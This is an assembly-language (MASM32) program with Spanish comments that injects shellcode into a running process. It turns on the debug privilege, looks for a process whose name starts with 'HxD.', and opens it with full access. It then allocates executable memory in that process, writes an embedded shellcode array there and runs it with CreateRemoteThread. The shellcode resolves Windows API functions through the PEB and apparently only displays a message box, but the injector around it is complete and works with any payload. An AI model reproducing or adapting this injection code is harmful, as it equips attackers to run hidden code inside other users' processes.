;
;
;           Programa inyector de shellcodes en procesos
;           Debemos entonces listar procesos para obtener
;           su nombre y poder obtner su PID
;
;


.486
.model flat, stdcall
.stack 100h
option casemap :none


; INCUDES
include \MASM32\INCLUDE\user32.inc
include \MASM32\INCLUDE\kernel32.inc
include \MASM32\INCLUDE\msvcrt.inc
include \MASM32\INCLUDE\ntdll.inc
include process.inc

;  Librerias
includelib \MASM32\LIB\user32.lib
includelib \MASM32\LIB\kernel32.lib
includelib \MASM32\LIB\msvcrt.lib
includelib \MASM32\LIB\ntdll.lib


NOT_ADMIN               EQU     0C0000061h
TH32CS_SNAPPROCESS      EQU      00000002h
PROCESS_ALL_ACCESS      EQU        1F0FFFh
PAGE_EXECUTE_READWRITE  EQU            40h
VIRTUAL_MEM             EQU          3000h
SE_DEBUG_PRIVILEGE      EQU             20

.data

    ; shellcode a ejecutar
    shellcode               db                    0E8h, 00h, 00h, 00h, 00h, 05Dh
                            db                    081h, 0EDh, 05h, 10h, 40h, 00h
                            db                    0EBh, 031h, 00h, 00h, 00h, 00h
                            db                    00h, 00h, 00h, 00h, 00h, 00h
                            db                    00h, 00h, 04Fh, 06Ah, 065h, 074h
                            db                    065h, 020h, 064h, 065h, 020h, 076h
                            db                    061h, 063h, 061h, 00h, 075h, 073h
                            db                    065h, 072h, 033h, 032h, 02Eh, 064h
                            db                    06Ch, 06Ch, 00h, 04Dh, 065h, 073h
                            db                    073h, 061h, 067h, 065h, 042h, 06Fh
                            db                    078h, 041h, 00h, 064h, 08Bh, 03Dh
                            db                    030h, 00h, 00h, 00h, 08Bh, 07Fh
                            db                    00Ch, 08Bh, 07Fh, 00Ch, 08Bh, 03Fh
                            db                    08Bh, 03Fh, 08Bh, 057h, 018h, 066h
                            db                    081h, 03Ah, 04Dh, 05Ah, 075h, 049h
                            db                    089h, 095h, 00Eh, 010h, 040h, 00h
                            db                    0E8h, 03Fh, 00h, 00h, 00h, 089h
                            db                    085h, 012h, 010h, 040h, 00h, 0E8h
                            db                    08Ch, 00h, 00h, 00h, 089h, 085h
                            db                    016h, 010h, 040h, 00h, 08Dh, 09Dh
                            db                    028h, 010h, 040h, 00h, 08Bh, 085h
                            db                    016h, 010h, 040h, 00h, 053h, 0FFh
                            db                    0D0h, 08Dh, 09Dh, 033h, 010h, 040h
                            db                    00h, 053h, 050h, 08Bh, 085h, 012h
                            db                    010h, 040h, 00h, 0FFh, 0D0h, 033h
                            db                    0C9h, 08Dh, 09Dh, 01Ah, 010h, 040h
                            db                    00h, 051h, 053h, 053h, 051h, 0FFh
                            db                    0D0h, 0C3h, 08Bh, 0BDh, 00Eh, 010h
                            db                    040h, 00h, 08Bh, 047h, 03Ch, 003h
                            db                    0C7h, 08Bh, 070h, 078h, 003h, 0F7h
                            db                    08Bh, 056h, 020h, 003h, 0D7h, 033h
                            db                    0C9h, 08Bh, 002h, 003h, 0C7h, 081h
                            db                    038h, 047h, 065h, 074h, 050h, 075h
                            db                    014h, 081h, 078h, 004h, 072h, 06Fh
                            db                    063h, 041h, 075h, 00Bh, 081h, 078h
                            db                    008h, 064h, 064h, 072h, 065h, 075h
                            db                    002h, 0EBh, 006h, 083h, 0C2h, 004h
                            db                    041h, 0EBh, 0DAh, 0D1h, 0C1h, 08Bh
                            db                    056h, 024h, 003h, 0D7h, 003h, 0D1h
                            db                    00Fh, 0B7h, 00Ah, 08Bh, 056h, 01Ch
                            db                    003h, 0D7h, 0C1h, 0C1h, 002h, 003h
                            db                    0D1h, 08Bh, 002h, 003h, 0C7h, 0C3h
                            db                    08Bh, 0BDh, 00Eh, 010h, 040h, 00h
                            db                    08Bh, 047h, 03Ch, 003h, 0C7h, 08Bh
                            db                    070h, 078h, 003h, 0F7h, 08Bh, 056h
                            db                    020h, 003h, 0D7h, 033h, 0C9h, 08Bh
                            db                    002h, 003h, 0C7h, 081h, 038h, 04Ch
                            db                    06Fh, 061h, 064h, 075h, 00Bh, 081h
                            db                    078h, 004h, 04Ch, 069h, 062h, 072h
                            db                    075h, 002h, 0EBh, 006h, 083h, 0C2h
                            db                    004h, 041h, 0EBh, 0E3h, 0D1h, 0C1h
                            db                    08Bh, 056h, 024h, 003h, 0D7h, 003h
                            db                    0D1h, 00Fh, 0B7h, 00Ah, 08Bh, 056h
                            db                    01Ch, 003h, 0D7h, 0C1h, 0C1h, 002h
                            db                    003h, 0D1h, 08Bh, 002h, 003h, 0C7h
                            db                    0C3h
                            
    shell_size              EQU                 $-shellcode

    PROCESS                 PROCESSENTRY32  1   DUP (<>)
    PID                     dd                  ?
    bytesWritten            dd                  ?
    threadId                dd                  ?
    functionAddress         dd                  ?
    Previous_value          dd                  0
.code

start:
    xor ebx,ebx
    
    ; Obtener los privilegios de apagado
    push offset Previous_value
    push ebx
    inc ebx
    push ebx
    push SE_DEBUG_PRIVILEGE
    call RtlAdjustPrivilege

    xor edx,edx
; Empezamos con la obtencion del snapshot
    push edx ; NULL
    push TH32CS_SNAPPROCESS
    call CreateToolhelp32Snapshot

    cmp eax,NOT_ADMIN
    jz finalizar

    mov ebx, eax ; guardamos el snapshot

; Obtencion del proceso

    ; Inicializa la estructura
        
    mov [PROCESS.dwSize], SIZEOF PROCESS

    push offset PROCESS
    push ebx
    call Process32First
    JMP mira_proceso

next_process:
    push offset PROCESS
    push ebx
    call Process32Next
    test eax,eax 
    jz finalizar
    
mira_proceso:
    push offset PROCESS.szExeFile
    call compara_cadena
    add esp,4
    test eax,eax
    jnz next_process

; destruyo el handle
    push ebx
    call CloseHandle
    
; Ya tengo el PID que busco
    
    push PROCESS.th32ProcessID
    push 0h
    push PROCESS_ALL_ACCESS
    call OpenProcess

; Ya tengo en EAX hProcessVictim
    mov ebx, eax

    push PAGE_EXECUTE_READWRITE
    push VIRTUAL_MEM
    push shell_size
    push 0h
    push ebx
    call VirtualAllocEx

; ya tengo en EAX la dirección obtenida con VirtualAllocEx
    mov functionAddress,eax
    
    
    push offset bytesWritten
    push shell_size
    push offset shellcode
    push functionAddress
    push ebx
    call WriteProcessMemory


    push offset threadId
    push 0h
    push 0h
    push functionAddress
    push 0h
    push 0h
    push ebx
    call CreateRemoteThread

finalizar:  
    push ebx
    call ExitProcess


compara_cadena:
    push ebp
    mov ebp,esp
    mov esi,[ebp+8]
    cmp DWORD PTR [ESI], '.DxH'
    jnz mal
    mov eax,0
    leave
    ret
mal:
    mov eax,1
    leave
    ret
    

end start